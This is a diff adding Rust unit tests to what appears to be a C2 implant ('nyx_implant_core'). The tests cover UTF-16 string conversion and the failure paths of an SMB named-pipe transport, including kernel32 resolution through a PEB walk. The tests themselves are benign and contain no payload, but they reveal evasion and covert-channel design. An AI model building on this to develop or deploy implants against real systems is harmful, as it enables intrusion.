@@ -415,3 +415,34 @@ unsafe fn read_exact(fns: &K32Fns, handle: Handle, buf: &mut [u8]) -> bool {
     }
     true
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::testutil;
+    use nyx_implant_core::heap::String;
+
+    #[test]
+    fn to_utf16_zero_extends_ascii_and_nul_terminates() {
+        assert_eq!(to_utf16(b"\\\\.\\pipe\\nyx").len(), "\\\\.\\pipe\\nyx".len() + 1);
+        assert_eq!(to_utf16(b"ab").as_slice(), &[0x61u16, 0x62, 0]);
+        assert_eq!(to_utf16(b"").as_slice(), &[0u16]);
+    }
+
+    #[test]
+    fn send_recv_rejects_empty_pipe_name() {
+        // No pipe configured → fail fast without touching kernel32.
+        let c = testutil::ctx("127.0.0.1", 9);
+        assert!(unsafe { send_recv(&c, b"x") }.is_none());
+    }
+
+    /// A configured but nonexistent pipe: CreateFileW must fail fast (dead
+    /// peer) and map to None. Exercises the kernel32 PEB-walk resolution and
+    /// the open-error path under wine.
+    #[test]
+    fn send_recv_missing_pipe_fails_fast() {
+        let mut c = testutil::ctx("127.0.0.1", 9);
+        c.smb_pipe_name = String::from("\\\\.\\pipe\\nyx_definitely_not_listening_9f3a");
+        assert!(unsafe { send_recv(&c, b"x") }.is_none());
+    }
+}
